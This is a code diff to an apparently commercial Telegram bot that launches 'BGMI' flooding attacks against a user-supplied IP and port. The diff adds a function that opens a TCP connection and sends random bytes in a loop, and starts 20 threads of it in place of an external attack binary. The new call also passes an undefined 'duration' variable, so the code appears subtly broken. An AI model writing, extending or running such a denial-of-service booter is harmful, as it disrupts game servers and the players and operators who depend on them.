@@ -53,6 +53,22 @@ def clear_logs():
     except FileNotFoundError:
         return "No logs found to clear"
 
+def send_packets_direct(ip, port, data, rate_limit, duration):
+    sock = None
+    end_time = time.time() + duration
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((ip, port))
+        while time.time() < end_time:
+            sock.send(data)
+            print(f"[Direct] Sent {len(data)} bytes to {ip}:{port}")
+            time.sleep(rate_limit)
+    except Exception as e:
+        logging.error(f"Error sending packet to {ip}:{port} directly: {e}")
+    finally:
+        if sock:
+            sock.close()
+
 bgmi_cooldown = {}
 COOLDOWN_TIME = 0
 
@@ -203,7 +219,9 @@ Buy From :- @ReporterAlpha'''
                 log_command(user_id, target, port, time)
                 bot.reply_to(message, f"{message.from_user.username or message.from_user.first_name}, Attack Started.\n\nTarget: {target}\nPort: {port}\nTime: {time} Seconds\nGame: BGMI")
                 full_command = f"./bgmi {target} {port} {time} 300"
-                subprocess.run(full_command, shell=True)
+                data = os.urandom(600)
+                for _ in range(20):  # 20 threads
+                    threading.Thread(target=send_packets_direct, args=(target, port, data, 0.1, duration)).start()
                 bot.reply_to(message, f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}")
         else:
             bot.reply_to(message, "Usage :- /bgmi <target> <port> <time>")
